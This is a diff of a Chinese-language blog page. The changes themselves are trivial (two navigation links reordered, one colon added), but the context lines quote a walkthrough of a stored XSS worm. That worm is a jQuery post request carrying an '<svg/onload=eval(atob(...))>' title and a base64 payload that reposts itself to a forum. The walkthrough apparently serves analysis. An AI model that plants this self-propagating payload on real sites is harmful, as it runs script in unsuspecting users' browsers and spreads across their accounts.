@@ -154,14 +154,14 @@
 
                         
                         <li>
-                            <a href="/tags/">Tags</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/tags/">Tags</a>
                         </li>
                         
                     
@@ -281,7 +281,7 @@
 <p>JS代码为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.post(&quot;/post.php?action=save&amp;fid=2&amp;cmd=topic&amp;topictype=0&quot;,&#123; title: &quot;&lt;svg/onload=eval(atob(jQuery(&apos;.content:first&apos;).html()))&gt;&quot;, content: &quot;JC5wb3N0KCIvcG9zdC5waHA/YWN0aW9uPXNhdmUmZmlkPTImY21kPXRvcGljJnRvcGljdHlwZT0wIix7IHRpdGxlOiAieHNzIHdvcm08c3ZnL29ubG9hZD1ldmFsKGF0b2IoalF1ZXJ5KCcuY29udGVudDpmaXJzdCcpLmh0bWwoKSkpPiIsIGNvbnRlbnQ6ICIiIH0pOw==&quot; &#125;)</span><br></pre></td></tr></table></figure>
 <p>来分析一下这段代码</p>
-<p>可以明显看到post请求数据，然后<code>title</code>和<code>content</code>的值以字典形式发送。<code>title</code>的值为一个svg标签，<code>jQuery(&quot;.content:first&quot;).html())</code>即可获得当前帖子的内容，贴子内容也就是<code>content</code>的值为</p>
+<p>可以明显看到post请求数据，然后<code>title</code>和<code>content</code>的值以字典形式发送。<code>title</code>的值为一个svg标签，<code>jQuery(&quot;.content:first&quot;).html())</code>即可获得当前帖子的内容，贴子内容也就是<code>content</code>的值为:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JC5wb3N0KCIvcG9zdC5waHA/YWN0aW9uPXNhdmUmZmlkPTImY21kPXRvcGljJnRvcGljdHlwZT0wIix7IHRpdGxlOiAieHNzIHdvcm08c3ZnL29ubG9hZD1ldmFsKGF0b2IoalF1ZXJ5KCcuY29udGVudDpmaXJzdCcpLmh0bWwoKSkpPiIsIGNvbnRlbnQ6ICIiIH0pOw==</span><br></pre></td></tr></table></figure>
 <p>该内容是通过base64加密的，所以在svg标签内通过eval解码</p>
 <p>将<code>content</code>的值解密后为：</p>
